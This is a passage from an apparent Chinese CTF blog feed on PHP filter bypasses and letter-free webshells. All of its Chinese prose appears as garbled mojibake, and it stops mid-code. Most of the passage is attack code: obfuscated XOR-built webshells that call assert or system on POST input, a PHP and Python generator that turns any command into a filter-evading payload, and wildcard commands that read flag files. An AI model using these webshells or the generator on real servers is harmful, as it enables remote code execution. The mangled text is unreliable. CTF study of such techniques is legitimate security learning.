class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å› ä¸º ereg å’Œ strpos å‡½æ•°éƒ½åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥æ•°ç»„è¿”å›çš„æ—¶NULLï¼ŒNULL ä¸ç­‰äº false åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡</h3><p>é¦–å…ˆé¢˜ç›®éœ€è¦è¾“å…¥å˜é‡ idï¼Œä¸”å˜é‡ id ä¸èƒ½åŒ…å«å­—ç¬¦ä¸² <code>hackerDJ</code>ã€‚æ¥ç€ä½¿ç”¨ urldecode() å‡½æ•°è¿›è¡Œ url è§£ç ï¼Œéœ€è¦ä»¤è§£ç åçš„å­—ç¬¦ä¸²ç­‰äº <code>hackerDJ</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br>      <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>      <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡äºŒæ¬¡URLç¼–ç æ¥ç»•è¿‡ï¼Œç”±äºæºç ä¼šä½¿ç”¨ urldecode() å‡½æ•°è¿›è¡Œ url è§£ç ï¼Œå› æ­¤å¯ä»¥å¯¹ <code>hackerDJ</code> è¿›è¡ŒäºŒæ¬¡URLç¼–ç ã€‚id åˆ°è¾¾ç¬¬ä¸€ä¸ª if è¯­å¥çš„æ—¶å€™è¿˜æ˜¯ <code>%68%61%63%6b%65%72%44%4a</code> åˆ°ç¬¬äºŒä¸ª if è¯­å¥çš„æ—¶å€™å·²ç»è¢«è§£ç æˆ <code>hackerDJ</code> äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id = %<span class="hljs-number">2568</span>%<span class="hljs-number">2561</span>%<span class="hljs-number">2563</span>%<span class="hljs-number">256</span>b%<span class="hljs-number">2565</span>%<span class="hljs-number">2572</span>%<span class="hljs-number">2544</span>%<span class="hljs-number">254</span>a<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"><a href="#ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡" class="headerlink" title="ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"></a>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-variable">$year</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;year&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$year</span>==<span class="hljs-number">2022</span> &amp;&amp; <span class="hljs-variable">$year</span>+<span class="hljs-number">1</span>!==<span class="hljs-number">2023</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?year=<span class="hljs-number">202.2e1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— å­—æ¯æ•°å­—webshell</title>
    <link href="/2023/01/18/No_alphanumeric_webshell/"/>
    <url>/2023/01/18/No_alphanumeric_webshell/</url>
    
    <content type="html"><![CDATA[<p>è€ç”Ÿå¸¸è°ˆçš„ä¸œè¥¿äº†ï¼Œä½†ä¹‹å‰ä¸€ç›´æ²¡æœ‰å¥½å¥½æ€»ç»“ã€‚åœ¨2023å±±çŸ³ç½‘ç§‘CTFå†¬ä»¤è¥ç»“è¥èµ›é‡åˆ°äº†ä¸€é“é¢˜å½“æ—¶æ²¡è§£å‡ºæ¥ï¼Œåé¢èŠ±äº†ä¸¤å¤©æ—¶é—´è§£å‡ºæ¥äº†ï¼Œéå¸¸ç—›è‹¦ï¼Œç°åœ¨å¥½å¥½æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="æ— å­—æ¯æ•°å­—WebShell"><a href="#æ— å­—æ¯æ•°å­—WebShell" class="headerlink" title="æ— å­—æ¯æ•°å­—WebShell"></a>æ— å­—æ¯æ•°å­—WebShell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šå°±æ˜¯å¯¹ä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ï¼Œä¸èƒ½ä¼ å…¥å­—æ¯å’Œæ•°å­—ã€‚</p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="PHPçŸ­æ ‡ç­¾"><a href="#PHPçŸ­æ ‡ç­¾" class="headerlink" title="PHPçŸ­æ ‡ç­¾"></a>PHPçŸ­æ ‡ç­¾</h3><p>é™¤äº†æœ€å¸¸è§çš„PHPæ ‡ç­¾<code>&lt;?php ?&gt;</code>ä¹‹å¤–ï¼ŒPHPè¿˜æœ‰ä¸¤ç§çŸ­æ ‡ç­¾</p><ul><li><code>&lt;??&gt;</code>  ç›¸å½“äº <code>&lt;?php&gt;</code></li><li><code>&lt;?=?&gt;</code> ç›¸å½“äº <code>&lt;?echo&gt;</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-string">&#x27;111&#x27;</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ä¼šè¾“å‡º111</span><br></code></pre></td></tr></table></figure><p>åœ¨PHP5.4ä»¥åï¼Œæ— è®ºshort_open_tagæ˜¯å¦å¼€å¯ï¼Œ<code>&lt;?=?&gt;</code>è¿™ç§å†™æ³•æ€»æ˜¯é€‚ç”¨çš„ï¼Œ<code>&lt;??&gt;</code>è¿™ç§å†™æ³•åˆ™éœ€è¦short_open_tagå¼€å¯æ‰è¡Œã€‚</p><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><ul><li>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ<code>?</code> ä¸å…¶å®ƒå­—ç¬¦ä¸€èµ·ç»„åˆæˆè¡¨è¾¾å¼ï¼Œ<strong>åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡</strong>ã€‚</li><li>åœ¨ Shell å‘½ä»¤è¡Œä¸­ï¼Œ<code>?</code> ä¸å…¶å®ƒå­—ç¬¦ä¸€èµ·ç»„åˆæˆè¡¨è¾¾å¼ï¼Œ<strong>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</strong>ã€‚</li><li>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ<code>*</code> ä¸å…¶å®ƒå­—ç¬¦ä¸€èµ·ç»„åˆæˆè¡¨è¾¾å¼ï¼Œ<strong>åŒ¹é…å‰é¢çš„å­—ç¬¦æˆ–è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡</strong>ã€‚</li><li>åœ¨ Shell å‘½ä»¤è¡Œä¸­ï¼Œ<code>*</code> ä¸å…¶å®ƒå­—ç¬¦ä¸€èµ·ç»„åˆæˆè¡¨è¾¾å¼ï¼Œ<strong>åŒ¹é…ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²</strong>ã€‚è¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦å¯ä»¥æ˜¯0ï¼Œå¯ä»¥æ˜¯1ï¼Œå¯ä»¥æ˜¯ä»»æ„æ•°å­—ã€‚</li></ul><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>?</code>å’Œ<code>*</code>åœ¨æ­£åˆ™è¡¨è¾¾å¼å’ŒShellå‘½ä»¤è¡Œä¸­çš„åŒºåˆ«ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">å‡è®¾flagåœ¨/flagä¸­:<br>cat /fla?<br>cat /fla*<br>    <br>å‡è®¾flagåœ¨/flag.txtä¸­:<br>cat /fla????<br>cat /fla*<br>    <br>å‡è®¾flagåœ¨/root/flag.txtä¸­:<br>cat /roo?/fla????<br>cat /ro*/fla*<br>    <br>å‡è®¾flagåœ¨flaggæ–‡ä»¶åŠ é‡Œ:<br>cat /?????/fla?<br>cat /?????/fla*<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸Šæ ¼å¼çš„Payloadè¯»å–flag</p><h3 id="PHP5ä¸PHP7çš„åŒºåˆ«"><a href="#PHP5ä¸PHP7çš„åŒºåˆ«" class="headerlink" title="PHP5ä¸PHP7çš„åŒºåˆ«"></a>PHP5ä¸PHP7çš„åŒºåˆ«</h3><ul><li><p>åœ¨ PHP 5 ä¸­ï¼Œ<code>assert()</code> æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>$_=assert;$_()</code> è¿™æ ·çš„å½¢å¼æ¥å®ç°ä»£ç çš„åŠ¨æ€æ‰§è¡Œã€‚</p></li><li><p>åœ¨ PHP 7 ä¸­ï¼Œ<code>assert()</code> å˜æˆäº†ä¸€ä¸ªå’Œ <code>eval()</code> ä¸€æ ·çš„è¯­è¨€ç»“æ„ï¼Œä¸å†æ”¯æŒä¸Šé¢é‚£ç§è°ƒç”¨æ–¹æ³•ã€‚ï¼ˆä½†æ˜¯å¥½åƒåœ¨ PHP 7.0.12 ä¸‹è¿˜èƒ½è¿™æ ·è°ƒç”¨ï¼‰</p></li><li><p>PHP5ä¸­ï¼Œæ˜¯ä¸æ”¯æŒ <code>($a)()</code> è¿™ç§è°ƒç”¨æ–¹æ³•çš„ï¼Œä½†åœ¨ PHP 7 ä¸­æ”¯æŒè¿™ç§è°ƒç”¨æ–¹æ³•ï¼Œå› æ­¤æ”¯æŒè¿™ä¹ˆå†™ <code>(&#39;phpinfo&#39;)();</code></p></li></ul><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%01&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>a<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%02&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>b<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%03&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>c<br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%18&#x27;</span>) ^ <span class="hljs-string">&#x27;`&#x27;</span>;<br>x<br></code></pre></td></tr></table></figure><h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>è¿™ç§æ”»å‡»æ–¹æ³•åœ¨PHP5ä¸­æ˜¯å¯è¡Œçš„ï¼Œå¦‚å‰é¢æ‰€è¯´ï¼Œåœ¨PHP7ä¸­ï¼Œassertå·²ç»æˆä¸ºäº†ä¸€ç§è¯­è¨€ç»“æ„ï¼Œä¸æ”¯æŒè¿™ç§è°ƒç”¨æ–¹å¼ã€‚</p><h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h3><p>assertä¸è¡Œäº†ï¼Œæˆ‘ä»¬æ¢ä¸€ä¸ªå‡½æ•°å…¶å®ä¹Ÿå¯ä»¥ã€‚è¿™é‡Œä½¿ç”¨system()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%19&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span> ^ <span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0d&#x27;</span> ^ <span class="hljs-string">&#x27;%60&#x27;</span>);<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);<br><br><span class="hljs-comment">//system($_POST[_])</span><br></code></pre></td></tr></table></figure><h3 id="å¼‚æˆ–æ„é€ è„šæœ¬"><a href="#å¼‚æˆ–æ„é€ è„šæœ¬" class="headerlink" title="å¼‚æˆ–æ„é€ è„šæœ¬"></a>å¼‚æˆ–æ„é€ è„šæœ¬</h3><p>é¦–å…ˆè¿è¡Œä»¥ä¸Š PHP è„šæœ¬åï¼Œä¼šç”Ÿæˆä¸€ä¸ª txt æ–‡æ¡£ xor_rce.txtï¼Œé‡Œé¢åŒ…å«æ‰€æœ‰å¯è§å­—ç¬¦çš„å¼‚æˆ–æ„é€ ç»“æœï¼Œå¯ä»¥é€šè¿‡é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹æ­£åˆ™ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>;    <span class="hljs-comment">// æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>æ¥ç€è¿è¡Œä»¥ä¸‹ Python è„šæœ¬ï¼Œè¾“å…¥ä½ æƒ³è¦æ„é€ çš„å‡½æ•°åå’Œè¦æ‰§è¡Œçš„å‘½ä»¤å³å¯ç”Ÿæˆæœ€ç»ˆçš„ Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your functionï¼šsystem<br>[+] your commandï¼šls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><p>åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚<code>&#39;å’Œ&#39;&#123;2&#125;</code>çš„ç»“æœæ˜¯<code>&quot;\x8c&quot;</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯<code>s</code>ï¼š</p><p>Pç¥çš„Webshellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><br><span 